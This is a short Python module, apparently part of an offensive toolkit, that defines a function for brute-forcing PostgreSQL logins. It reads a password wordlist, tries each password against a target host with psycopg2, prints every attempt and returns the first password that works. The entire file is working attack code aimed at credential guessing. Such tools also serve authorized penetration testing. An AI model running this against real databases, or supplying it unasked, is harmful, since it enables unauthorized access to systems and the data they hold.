import psycopg2
from psycopg2 import OperationalError
from typing import Optional
from .utils import clear_line


def postgres_bruteforce(
    host: str,
    username: str,
    wordlist_path: str,
    port: int = 5432,
    timeout: int = 3,
    dbname: str = "postgres",
) -> Optional[str]:
    """
    Attempt PostgreSQL brute force attack using a password wordlist.

    Args:
        host (str): Target hostname or IP address.
        username (str): Username to authenticate.
        wordlist_path (str): Path to file containing passwords (one per line).
        port (int, optional): PostgreSQL port. Defaults to 5432.
        dbname (str, optional): Database name to connect to. Defaults to "postgres".

    Returns:
        Optional[str]: The password if authentication succeeds; otherwise None.
    """
    with open(wordlist_path, "r") as f:
        for line in f:
            password = line.strip()

            clear_line()
            print(f"[?] Trying PostgreSQL {username}:{password}", end="\r")
            try:
                conn = psycopg2.connect(
                    host=host,
                    user=username,
                    password=password,
                    port=port,
                    dbname=dbname,
                    connect_timeout=timeout,
                )
                print(f"[+] PostgreSQL login succeeded: {username}:{password}")
                conn.close()
                return password
            except OperationalError:
                clear_line()
                print(
                    f"[-] PostgreSQL login failed for {username}:{password}", end="\r"
                )
                continue
            except Exception as e:
                clear_line()
                print(
                    f"Connection error or other POSTGRES issues: {e}. Continuing...",
                    end="\r",
                )
                continue
    print("[!] No valid password found.")
    return None
